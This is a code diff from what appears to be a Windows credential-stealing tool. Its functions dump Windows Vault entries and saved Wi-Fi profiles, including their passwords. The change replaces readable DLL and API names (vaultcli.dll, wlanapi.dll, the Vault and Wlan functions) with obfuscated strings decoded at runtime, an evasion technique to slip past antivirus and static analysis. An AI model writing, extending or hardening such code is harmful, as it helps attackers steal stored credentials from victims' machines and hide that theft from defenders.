@@ -63,23 +63,29 @@ int cred_dump_vault(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten
 
     _append(outBuf, outBufSize, &off, "=== Windows Vault ===\nVAULT\tRESOURCE\tIDENTITY\tLAST_MODIFIED\n");
 
-    HMODULE hVault = LoadLibraryW(L"vaultcli.dll");
+    char _sv[] = S_VAULTCLI_DLL; _DEOBF(_sv);
+    HMODULE hVault = LoadLibraryA(_sv);
     if (!hVault) {
         _append(outBuf, outBufSize, &off, "(vaultcli.dll not available)\n");
         *bytesWritten = off;
         return 0;
     }
 
+    char _s1[] = S_VaultEnumerateVaults; _DEOBF(_s1);
+    char _s2[] = S_VaultOpenVault; _DEOBF(_s2);
+    char _s3[] = S_VaultEnumerateItems; _DEOBF(_s3);
+    char _s4[] = S_VaultCloseVault; _DEOBF(_s4);
+    char _s5[] = S_VaultFree; _DEOBF(_s5);
     fn_VaultEnumerateVaults pEnumVaults =
-        (fn_VaultEnumerateVaults)GetProcAddress(hVault, "VaultEnumerateVaults");
+        (fn_VaultEnumerateVaults)GetProcAddress(hVault, _s1);
     fn_VaultOpenVault pOpenVault =
-        (fn_VaultOpenVault)GetProcAddress(hVault, "VaultOpenVault");
+        (fn_VaultOpenVault)GetProcAddress(hVault, _s2);
     fn_VaultEnumerateItems pEnumItems =
-        (fn_VaultEnumerateItems)GetProcAddress(hVault, "VaultEnumerateItems");
+        (fn_VaultEnumerateItems)GetProcAddress(hVault, _s3);
     fn_VaultCloseVault pCloseVault =
-        (fn_VaultCloseVault)GetProcAddress(hVault, "VaultCloseVault");
+        (fn_VaultCloseVault)GetProcAddress(hVault, _s4);
     fn_VaultFree pFree =
-        (fn_VaultFree)GetProcAddress(hVault, "VaultFree");
+        (fn_VaultFree)GetProcAddress(hVault, _s5);
 
     if (!pEnumVaults || !pOpenVault || !pEnumItems || !pCloseVault || !pFree) {
         FreeLibrary(hVault);
@@ -279,19 +285,26 @@ int cred_dump_wifi(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten)
 
     _append(outBuf, outBufSize, &off, "=== Wi-Fi Profiles ===\nSSID\tAUTH\tENCRYPTION\tPASSWORD\n");
 
-    HMODULE hWlan = LoadLibraryW(L"wlanapi.dll");
+    char _sw[] = S_WLANAPI_DLL; _DEOBF(_sw);
+    HMODULE hWlan = LoadLibraryA(_sw);
     if (!hWlan) {
         _append(outBuf, outBufSize, &off, "(wlanapi.dll not available — no Wi-Fi)\n");
         *bytesWritten = off;
         return 0;
     }
 
-    fn_WlanOpenHandle pOpen = (fn_WlanOpenHandle)GetProcAddress(hWlan, "WlanOpenHandle");
-    fn_WlanCloseHandle pClose = (fn_WlanCloseHandle)GetProcAddress(hWlan, "WlanCloseHandle");
-    fn_WlanEnumInterfaces pEnumIf = (fn_WlanEnumInterfaces)GetProcAddress(hWlan, "WlanEnumInterfaces");
-    fn_WlanGetProfileList pGetList = (fn_WlanGetProfileList)GetProcAddress(hWlan, "WlanGetProfileList");
-    fn_WlanGetProfile pGetProfile = (fn_WlanGetProfile)GetProcAddress(hWlan, "WlanGetProfile");
-    fn_WlanFreeMemory pFreeMem = (fn_WlanFreeMemory)GetProcAddress(hWlan, "WlanFreeMemory");
+    char _w1[] = S_WlanOpenHandle; _DEOBF(_w1);
+    char _w2[] = S_WlanCloseHandle; _DEOBF(_w2);
+    char _w3[] = S_WlanEnumInterfaces; _DEOBF(_w3);
+    char _w4[] = S_WlanGetProfileList; _DEOBF(_w4);
+    char _w5[] = S_WlanGetProfile; _DEOBF(_w5);
+    char _w6[] = S_WlanFreeMemory; _DEOBF(_w6);
+    fn_WlanOpenHandle pOpen = (fn_WlanOpenHandle)GetProcAddress(hWlan, _w1);
+    fn_WlanCloseHandle pClose = (fn_WlanCloseHandle)GetProcAddress(hWlan, _w2);
+    fn_WlanEnumInterfaces pEnumIf = (fn_WlanEnumInterfaces)GetProcAddress(hWlan, _w3);
+    fn_WlanGetProfileList pGetList = (fn_WlanGetProfileList)GetProcAddress(hWlan, _w4);
+    fn_WlanGetProfile pGetProfile = (fn_WlanGetProfile)GetProcAddress(hWlan, _w5);
+    fn_WlanFreeMemory pFreeMem = (fn_WlanFreeMemory)GetProcAddress(hWlan, _w6);
 
     if (!pOpen || !pClose || !pEnumIf || !pGetList || !pGetProfile || !pFreeMem) {
         FreeLibrary(hWlan);
